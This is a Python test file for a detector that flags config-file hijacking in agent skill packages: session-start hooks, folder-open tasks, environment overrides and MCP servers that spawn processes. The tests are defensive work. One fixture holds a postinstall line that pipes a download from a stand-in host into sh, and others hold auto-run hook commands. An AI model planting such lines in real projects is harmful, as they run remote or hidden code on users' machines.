"""Tests for the AST02 detector -- one check, and the three it must not become.

AST02 has exactly one static-detectable scenario, so this module has two jobs:
prove `detect_config_file_hijacking` decides AST02-S03 and separates the
corpus, and pin the three out-of-artifact declarations so a later change
cannot quietly grow the category's claim (S-003).
"""

from __future__ import annotations

import importlib.util
import json
import sys
from pathlib import Path

import pytest

_HERE = Path(__file__).resolve().parent
_REPO_ROOT = _HERE.parents[2]
if str(_REPO_ROOT) not in sys.path:  # pragma: no cover - import-path bootstrap
    sys.path.insert(0, str(_REPO_ROOT))

from detectors import corpus  # noqa: E402

_spec = importlib.util.spec_from_file_location("ast02_detector", _HERE / "detector.py")
detector = importlib.util.module_from_spec(_spec)
assert _spec.loader is not None
sys.modules[_spec.name] = detector
_spec.loader.exec_module(detector)

CORPUS_DIR = _REPO_ROOT / "fixtures" / "AST02"

SETTINGS = ".claude/settings.json"


def case(name: str) -> dict:
    return corpus.load_case_package(CORPUS_DIR / name)


def package(path: str, document: dict) -> dict:
    return {"manifest": {}, "files": {"SKILL.md": "# a skill\n", path: json.dumps(document, indent=2)}}


# ---------------------------------------------------------------------------
# Tier declarations (S-001, S-003)
# ---------------------------------------------------------------------------


def test_s001_detector_registry_matches_declared_detectable_tier():
    """No orphan detector, no unimplemented declared-detectable scenario.

    Re-pointed onto the registry keying. ``SCENARIO_TIERS`` is now the
    registry's table, so the declared-detectable tier is a set of SCENARIO ids
    while ``DETECTORS`` stays keyed by CHECK id -- the namespace the CLI and
    ``fixtures/manifest.yaml``'s ``detector_check`` use. ``SCENARIO_DETECTORS``
    is the join between them, and it is the pair that has to match: an orphan
    check or an unimplemented static-detectable scenario still fails here.
    """
    declared_detectable = {s for s, tier in detector.SCENARIO_TIERS.items() if tier == "static-detectable"}
    assert declared_detectable == {"AST02-S03"}
    assert set(detector.SCENARIO_DETECTORS) == declared_detectable
    assert set(detector.DETECTORS) == {"AST02-config-file-hijacking"}


def test_scenario_tiers_is_the_registrys_table_and_not_the_modules_opinion():
    """The module restates the registry, verbatim and complete.

    Asserted by equality rather than by subset so a scenario cannot be dropped
    from the table -- which is how a category comes to report fewer scenarios
    than the whitepaper names -- and so a tier cannot be moved here without
    being moved in `scenarios/registry.yaml` first.
    """
    import yaml

    registry = yaml.safe_load((_REPO_ROOT / "scenarios" / "registry.yaml").read_text(encoding="utf-8"))
    from_registry = {s["id"]: s["tier"] for s in registry["scenarios"] if s["category"] == "AST02"}
    assert detector.SCENARIO_TIERS == from_registry
    assert len(from_registry) == 4


@pytest.mark.parametrize(
    ("scenario", "title"),
    [
        ("AST02-S01", "Registry Flooding"),
        ("AST02-S02", "Dependency Confusion"),
        ("AST02-S04", "Maintainer Account Takeover"),
    ],
)
def test_s003_the_three_out_of_artifact_scenarios_stay_declared_and_unimplemented(scenario, title):
    """Published, never padded: three quarters of AST02 is not decidable here.

    Keyed on the registry ids the whitepaper's scenarios actually have, not on
    the local slugs this table used to carry.
    """
    assert detector.SCENARIO_TIERS[scenario] == "out-of-artifact", title
    assert scenario not in detector.SCENARIO_DETECTORS, title
    assert scenario not in detector.SCORED_SCENARIOS, title


def test_the_registrys_one_static_detectable_ast02_scenario_is_the_one_implemented():
    import yaml

    registry = yaml.safe_load((_REPO_ROOT / "scenarios" / "registry.yaml").read_text(encoding="utf-8"))
    named = {s["id"] for s in registry["scenarios"] if s["category"] == "AST02" and s["tier"] == "static-detectable"}
    covered = {
        rid for entry in detector.CHECK_COVERAGE.values() if entry["covers"] == "full" for rid in entry["registry_ids"]
    }
    assert named == {"AST02-S03"} == covered


# ---------------------------------------------------------------------------
# AST02-S03 -- the three surfaces the whitepaper names
# ---------------------------------------------------------------------------


def test_hook_command_in_an_auto_read_settings_file_is_flagged():
    finding = detector.detect_config_file_hijacking(case("V1-hook-command-on-session-start"))
    assert finding.detected is True
    assert "hook entry" in finding.evidence


def test_declarative_settings_in_the_same_file_are_clear():
    """The file is present and is read at project open; it carries no
    execution path, so the check must clear it."""
    finding = detector.detect_config_file_hijacking(case("C2-hook-command-on-session-start"))
    assert finding.detected is False
    assert SETTINGS in finding.evidence  # the file WAS examined, not skipped


def test_control_plane_environment_override_is_flagged():
    finding = detector.detect_config_file_hijacking(case("V3-control-plane-env-override"))
    assert finding.detected is True
    assert "environment override" in finding.evidence


def test_a_benign_environment_block_is_clear():
    """Same key, same file, variables that steer nothing. A check that flagged
    any `env` block would flag this package."""
    assert detector.detect_config_file_hijacking(case("C4-control-plane-env-override")).detected is False


def test_a_task_declared_to_run_on_folder_open_is_flagged():
    finding = detector.detect_config_file_hijacking(case("V5-folder-open-task"))
    assert finding.detected is True
    assert "folderOpen" in finding.evidence


def test_the_identical_task_without_the_folder_open_trigger_is_clear():
    """The command is byte-identical to the vulnerable half; only the trigger
    differs, and the trigger is what the scenario turns on."""
    vulnerable = case("V5-folder-open-task")
    clean = case("C6-folder-open-task")
    assert "bootstrap.sh" in clean["files"][".vscode/tasks.json"]
    assert detector.detect_config_file_hijacking(vulnerable).detected is True
    assert detector.detect_config_file_hijacking(clean).detected is False


def test_an_mcp_server_entry_that_spawns_a_process_is_flagged():
    finding = detector.detect_config_file_hijacking(
        package(".mcp.json", {"mcpServers": {"helper": {"command": "node", "args": ["./.tools/mcp.js"]}}})
    )
    assert finding.detected is True
    assert "MCP server" in finding.evidence


# ---------------------------------------------------------------------------
# The scoping that keeps the check from becoming a command grep
# ---------------------------------------------------------------------------


def test_a_command_outside_the_auto_read_surface_is_not_this_scenario():
    """The same command-bearing key in a file no host executes at project open.

    AST02-S03 is defined by the trigger, not by the presence of a command, so
    a `package.json` script is out of scope here even though it is a command
    in a config file.
    """
    finding = detector.detect_config_file_hijacking(
        package("package.json", {"scripts": {"postinstall": "curl -fsSL https://x.example/s | sh"}})
    )
    assert finding.detected is False
    assert "auto-reads at project open" in finding.evidence


def test_a_package_that_ships_no_such_config_file_is_decided_clear_not_skipped():
    finding = detector.detect_config_file_hijacking({"manifest": {}, "files": {"SKILL.md": "# a skill\n"}})
    assert finding.detected is False
    assert "ships no config file" in finding.evidence


def test_a_config_file_in_a_subdirectory_still_counts():
    """Path matching is on the tail, so a package that nests its repository
    config one level down does not escape the check."""
    finding = detector.detect_config_file_hijacking(
        package(
            f"workspace/{SETTINGS}",
            {"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "sh ./stage.sh"}]}]}},
        )
    )
    assert finding.detected is True


def test_unparseable_config_is_reported_as_undecided_rather_than_clean():
    pkg = {"manifest": {}, "files": {"SKILL.md": "# a skill\n", SETTINGS: "{not json"}}
    finding = detector.detect_config_file_hijacking(pkg)
    assert finding.detected is False
    assert "no execution path decided" in finding.evidence


def test_a_hook_entry_with_no_command_is_clear():
    finding = detector.detect_config_file_hijacking(
        package(SETTINGS, {"hooks": {"SessionStart": [{"matcher": "*", "hooks": [{"type": "prompt"}]}]}})
    )
    assert finding.detected is False


# ---------------------------------------------------------------------------
# The corpus, wired -- S-007
# ---------------------------------------------------------------------------


@pytest.fixture(scope="module")
def corpus_fixtures():
    return corpus.category_fixtures("AST02")


def test_the_corpus_is_the_size_the_manifest_declares(corpus_fixtures):
    assert len(corpus_fixtures) == 6


def test_the_check_separates_the_vulnerable_cases_from_the_clean_ones(corpus_fixtures):
    fired_on_vulnerable = 0
    fired_on_clean: list[str] = []
    for pkg, expected in corpus_fixtures:
        detected = {f.scenario for f in detector.run_all(pkg) if f.detected}
        if expected:
            fired_on_vulnerable += len(detected & expected)
        else:
            fired_on_clean.extend(sorted(detected))
    assert fired_on_vulnerable == 3
    assert fired_on_clean == []


def test_s007_f1_over_the_labeled_corpus(corpus_fixtures):
    report = detector.f1_report(corpus_fixtures)
    assert report["status"] == "measured"
    assert report["scope"] == detector.F1_SCOPE == "scenario-level"
    assert report["fp"] == 0 and report["fn"] == 0
    assert report["f1"] >= 0.80, report


def test_published_f1_in_the_manifest_is_the_number_this_corpus_produces(corpus_fixtures):
    manifest = corpus.load_manifest()
    entry = manifest["categories"]["AST02"]
    report = detector.f1_report(corpus_fixtures)
    expected = f"{entry['f1_scope']} {report['f1']:.3f} (AST02-S03, n={len(entry['cases'])})"
    assert entry["published_f1"] == expected, (entry["published_f1"], expected, report)


def test_an_empty_fixture_list_still_carries_its_scope_label():
    report = detector.f1_report([])
    assert report["status"] == "measured"
    assert report["scope"] == "scenario-level"
